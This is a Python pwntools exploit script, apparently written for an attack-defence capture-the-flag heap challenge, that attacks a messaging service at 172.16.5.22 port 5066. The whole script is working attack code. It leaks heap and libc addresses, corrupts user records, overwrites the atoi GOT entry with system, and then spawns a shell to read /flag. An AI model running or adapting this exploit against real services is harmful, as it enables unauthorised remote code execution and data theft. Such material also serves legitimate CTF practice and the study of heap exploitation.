#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="warn"
pwn_file="p22/pwn22"
os.environ={"LD_LIBRARY_PATH":"./"}
elf=ELF(pwn_file)
libc=ELF("p22/libc.so.6")

def exploit(ip):
    heap_add=0
    r=remote(ip,5066,timeout=3)
    def debug():
        log.debug("process pid:%d"%pid)
        #log.debug("stack add:0x%x"%stack_add)
        log.debug("heap add:0x%x"%heap_add)
        log.debug("libc add:0x%x"%libc.address)
        pause()

    def reg(size,user,age,desc):
        r.sendafter("choice:","2",timeout=0.5)
        r.sendafter("size:",str(size),timeout=0.5)
        r.sendafter("name:",user,timeout=0.5)
        r.sendafter("age:",str(age),timeout=0.5)
        if age>17:
            r.sendafter("description:",desc,timeout=0.5)

    def login(user):
        r.sendafter("choice:","1",timeout=0.5)
        r.sendafter("name:",user,timeout=0.5)

    def add(name):
        r.sendafter("choice:","3",timeout=0.5)
        r.sendafter("name:",name,timeout=0.5)
        r.sendafter("(a/d)","a",timeout=0.5)
    def dele(name):
        r.sendafter("choice:","3",timeout=0.5)
        r.sendafter("name:",name,timeout=0.5)
        r.sendafter("(a/d)","d",timeout=0.5)

    def edit(name,age,desc):
        r.sendafter("choice:","2",timeout=0.5)
        r.sendafter("name",name,timeout=0.5)
        r.sendafter("age:",str(age),timeout=0.5)
        r.sendafter("ption:",desc,timeout=0.5)

    def show():
        r.sendafter("choice:","1",timeout=0.5)
        r.recvuntil("Username:",timeout=0.5)
        name=r.recvline(timeout=0.5)[:-1]
        r.recvuntil("Age:",timeout=0.5)
        age=int("0x"+r.recvline(timeout=0.5),16)
        r.recvuntil("Description:",timeout=0.5)
        desc=r.recvline(timeout=0.5)[:-1]
        return name,age,desc

    def send(title,content,user):
        r.sendafter("choice:","4",timeout=0.5)
        r.sendafter("a msg to:",user,timeout=0.5)
        r.sendafter("title:",title,timeout=0.5)
        r.sendafter("content:",content,timeout=0.5)

    def logout():
        r.sendafter("choice:","6",timeout=0.5)

    try:
        reg(0x20,"a"*0x10,20,"a"*0x100)
        reg(0x20,"b"*0x10,20,"a"*0x100)
        reg(0x20,"c"*0x10,20,"a"*0x100)
        login("a"*0x10)
        add("b"*0x10)
        name,age,desc=show()
        heap_add=u64(desc[0x100:].ljust(8,"\x00"))-0x2640
        dele("b"*0x10)
        logout()
        login(p64(heap_add+0x26f0))
        name,age,desc=show()
        libc.address=age-0x3c4b78-0x1c40
        logout()
        login("a"*0x10)
        send("d"*8+"\x00","d"*8,"c"*0x10)
        logout()
        login("d"*8+"\x00")
        f={
            0x48:p64(0x101)
        }
        edit("d"*8,0x20,fit(f,filler="\x00"))
        logout()
        login("a"*0x10+"\x00")
        f={
            0xb0:p64(elf.got["atoi"]),
        }
        send(fit(f,filler="1"),"a","c"*0x10+"\x00")
        logout()
        login(p64(libc.sym["atoi"]))
        edit(p64(libc.sym["system"])[:6],20,"a")
        r.sendafter("choice:","/bin/sh",timeout=0.5)
        r.clean()
        r.sendline("cat /flag")
        flag=r.recvline(timeout=0.5)[:-1]
        r.close()
    except Exception as e:
        r.close()
        raise e
    return flag

if __name__ == "__main__":
    print exploit("172.16.5.22")
